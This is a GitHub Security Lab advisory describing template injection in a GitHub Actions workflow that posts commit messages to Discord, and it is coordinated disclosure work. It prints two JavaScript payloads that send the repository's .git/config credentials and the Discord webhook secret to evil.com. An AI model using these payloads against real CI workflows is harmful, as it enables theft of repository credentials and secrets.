md-10">
    <header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">March 11, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-324: Template injection in a GitHub workflow of koriwi/freedeck-configurator</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2020-12-04: Issue reported to maintainers</li>
  <li>2021-01-22: Report acknowledged</li>
  <li>2021-03-09: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/koriwi/freedeck-configurator/blob/master/.github/workflows/develop.yml">‘develop.yml’ GitHub workflow</a> is vulnerable to template injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/koriwi/freedeck-configurator">koriwi/freedeck-configurator GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest changeset to the date <a href="https://github.com/koriwi/freedeck-configurator/blob/9bcff8a43f3b88f4d137b1395bcad2cba4df8c5c/.github/workflows/develop.yml">9bcff8a</a>.</p>

<h2 id="details">Details</h2>

<h3 id="issue-a-commit-comment-is-used-to-format-a-discord-message">Issue: A commit comment is used to format a Discord message</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">push</span><span class="pi">:</span>
<span class="nn">...</span>
        <span class="na">uses</span><span class="pi">:</span> <span class="s">Ilshidur/action-discord@0.0.2</span>
        <span class="na">env</span><span class="pi">:</span>
          <span class="na">DISCORD_WEBHOOK</span><span class="pi">:</span> <span class="s">${{ secrets.WEBHOOK_URL }}</span>
        <span class="na">with</span><span class="pi">:</span>
          <span class="na">args</span><span class="pi">:</span> <span class="s2">"</span><span class="s">A</span><span class="nv"> </span><span class="s">new</span><span class="nv"> </span><span class="s">develop</span><span class="nv"> </span><span class="s">version</span><span class="nv"> </span><span class="s">has</span><span class="nv"> </span><span class="s">been</span><span class="nv"> </span><span class="s">deployed!</span><span class="nv"> </span><span class="s">What's</span><span class="nv"> </span><span class="s">new?</span><span class="nv"> </span><span class="s">**${{</span><span class="nv"> </span><span class="s">github.event.head_commit.message</span><span class="nv"> </span><span class="s">}}**</span><span class="nv"> </span><span class="s">https://fddev.gosewis.ch"</span>
<span class="nn">...</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">${{ github.event.head_commit.message }}</code>, used here, allows for injection of arbitrary markdown into the Discord message.</p>

<p>An attacker may create a specially crafted commit description and make a valid pull request, that will be merged. It is likely that the reviewer will not notice it, especially if there are multiple commits in the single PR.</p>

<h4 id="impact">Impact</h4>

<p>Current impact is almost negligible, but the vulnerability may potentially become much more serious if the workflow is updated to use a newer version of the action. Since v0.3.0 the Discord action supports interpolation syntax for environment arguments. There are examples of indented usage in a documentation like <code class="language-plaintext highlighter-rouge">The project {{ EVENT_PAYLOAD.repository.full_name }} has been deployed</code>. The interpolation is implemented in a way that the expressions may be interpreted as javascript:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">_</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">_</span><span class="p">.</span><span class="nx">template</span><span class="p">(</span><span class="nx">args</span><span class="p">)({</span> <span class="p">...</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">,</span> <span class="na">EVENT_PAYLOAD</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">eventContent</span><span class="p">)</span> <span class="p">});</span>
</code></pre></div></div>

<p>This vulnerability allows for arbitrary code execution in the context of a GitHub runner.
 Since a checkout action is used without <code class="language-plaintext highlighter-rouge">persist-credentials</code> set to <code class="language-plaintext highlighter-rouge">false</code> an attacker could get a write access to the repository with the payload below:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://evil.com?t=</span><span class="dl">'</span><span class="o">+</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./.git/config</span><span class="dl">'</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">))</span> <span class="p">}}</span>
</code></pre></div></div>

<p>The following payload would exfiltrate the secret DISCORD_WEBHOOK to the attacker controlled server. This would give the attacker full control over Discord message hook.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://evil.com?t=${WEBHOOK_URL}</span><span class="dl">'</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-324</code> in any communication regarding this